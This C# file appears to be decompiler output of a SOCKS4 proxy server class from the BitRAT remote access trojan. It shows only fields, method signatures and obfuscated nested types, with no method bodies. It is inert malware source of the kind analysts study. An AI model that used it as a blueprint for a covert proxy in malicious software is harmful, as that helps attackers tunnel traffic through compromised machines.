﻿namespace BitRAT
{
    using System;
    using System.Net;
    using System.Net.Sockets;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;

    public class cSocks4Server
    {
        public int PORT_MAIN;
        public string MSG_START_ERR;

        public cSocks4Server();
        [CompilerGenerated]
        private void _Lambda$__9-0();
        private void ClientConnectionThread(ref cSocks4Server.Struct30 cci);
        private void ClientThread(ref Socket sck, bool new_client);
        private bool IS_CONNECTED(Socket tcpSocket);
        private bool QueryProxy(Socket s_recv, Socket s_send);
        public int Start(int port);
        private bool StartServer(int port, ref Socket socket_0, ref IPEndPoint ep);
        private void StartSocket();

        internal sealed class Class154
        {
            public cSocks4Server.Struct30 struct30_0;
            public cSocks4Server cSocks4Server_0;

            public Class154(cSocks4Server.Class154 class154_0);
            internal void _Lambda$__0();
        }

        internal sealed class Class155
        {
            public Socket socket_0;
            public cSocks4Server cSocks4Server_0;

            public Class155(cSocks4Server.Class155 class155_0);
            internal void _Lambda$__0();
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct Struct30
        {
            public Socket socket_0;
            public Socket socket_1;
        }
    }
}

